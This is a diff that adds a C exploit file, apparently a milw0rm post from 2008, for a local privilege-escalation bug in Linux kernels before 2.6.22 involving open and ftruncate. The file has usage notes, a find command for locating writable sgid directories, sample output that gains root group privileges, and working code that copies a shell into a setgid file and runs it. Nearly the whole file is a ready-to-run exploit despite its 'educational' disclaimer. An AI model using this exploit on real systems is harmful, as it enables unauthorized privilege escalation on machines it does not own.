@@ -1,0 +1,88 @@
+/*
+gw-ftrex.c:
+
+Linux kernel < 2.6.22 open/ftruncate local exploit
+by <gat3way at gat3way dot eu>
+
+bug information:
+http://osvdb.org/49081
+
+
+!!!This is for educational purposes only!!!
+
+To use it, you've got to find a sgid directory you've got
+permissions to write into (obviously world-writable), e.g:
+find / -perm -2000 -type d 2>/dev/null|xargs ls -ld|grep "rwx"
+which fortunately is not common those days :)
+And also a shell that does not drop sgid privs upon execution (like ash/sash).
+E.g:
+
+test:/fileserver/samba$ ls -ld
+drwxrwsrwx 2 root root 4096 2008-10-27 16:27.
+test:/fileserver/samba$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+test:/fileserver/samba$ /tmp/gw-ftrex
+ash shell found!
+size=80200
+We're evil evil evil!
+
+$ id
+uid=33(www-data) gid=33(www-data) egid=0(root) groups=33(www-data)
+
+Trqbva da kaja neshto umno kato zakliuchenie...ma sega ne moga da se setia.
+*/
+
+
+
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+
+int main(int argc, char *argv[])
+{
+char *buf=malloc(3096*1024); //3mb just to be sure
+int a,len;
+int fd,fd1;
+char *buf1;
+int shell=0;
+
+
+if (stat("/bin/ash",buf)==0)
+{
+    printf("ash shell found!\n");
+    shell=1;
+}
+
+if (shell==0) if (stat("/bin/sash",buf)==0)
+{
+    printf("sash shell found!\n");
+    shell=1;
+}
+
+if (shell==0)
+{
+    printf("no suitable shell found (one that does not drop sgid permissions) :(\n");
+    exit(2);
+}
+
+
+len=0;
+if (shell==1) fd=open("/bin/ash",O_RDONLY);
+if (shell==2) fd=open("/bin/sash",O_RDONLY);
+
+while (read(fd,buf+len,1)) len++;
+
+printf("size=%d\n",len);
+fd1=open(".evilsploit",O_RDWR | O_CREAT | O_EXCL, 02750);
+ftruncate(fd1, len);
+buf1 = mmap(NULL, len, PROT_WRITE | PROT_EXEC, MAP_SHARED, fd1, 0);
+memcpy(buf1,buf,len); 
+munmap(buf1,len);
+close(fd1);close(fd);
+free(buf);
+printf("We're evil evil evil!\n\n");
+execv(".evilsploit", NULL);
+}
+
+// milw0rm.com [2008-10-27]
